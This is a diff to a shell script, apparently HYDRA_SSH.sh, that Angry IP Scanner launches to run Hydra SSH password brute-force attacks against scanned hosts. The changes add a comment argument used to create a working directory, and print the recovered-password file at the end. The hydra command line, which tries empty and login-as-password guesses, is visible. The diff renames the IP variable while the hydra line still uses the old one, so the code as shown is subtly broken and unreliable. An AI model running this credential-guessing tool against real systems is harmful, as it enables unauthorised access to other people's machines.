@@ -3,7 +3,7 @@
 # Angry IP information -----------------------------------------------------------
 # | Angry Name                 | Execution String              | Run in Terminal | Directory |
 # | -------------------------- | ----------------------------- | --------------- | --------- |
-# | 22_SSH - HYDRA | THIS_FILE ${fetcher.ip} | TRUE            |           |
+# | 22_SSH - HYDRA | THIS_FILE ${fetcher.ip} ${fetcher.comment}| TRUE            |           |
 
 # Script information -----------------------------------------------------------
 # | Script Name       : HYDRA_SSH.sh
@@ -13,7 +13,13 @@
 # | Date              : August 24, 2023
 # ------------------------------------------------------------------------------      :
 
-address=$1
+# Assign the IP address to the variable
+fetcher_ip=$1  # Replace with the actual IP address
+#fetcher_ip="10.81.252.14"  # Replace with the actual IP address
+comment=$2
+
+mkdir ~/Documents/BOXES/$comment
+cd ~/Documents/BOXES/$comment
 
 # Define color variables
 GREEN=$(tput setaf 2)
@@ -90,3 +96,5 @@ hydra $username_section $password_section $address ssh -e ns $verbose -I
 # ...
 
 echo -e "${RED}Hydra attack finished.${NC}"
+
+cat hydra_ssh_pw.txt
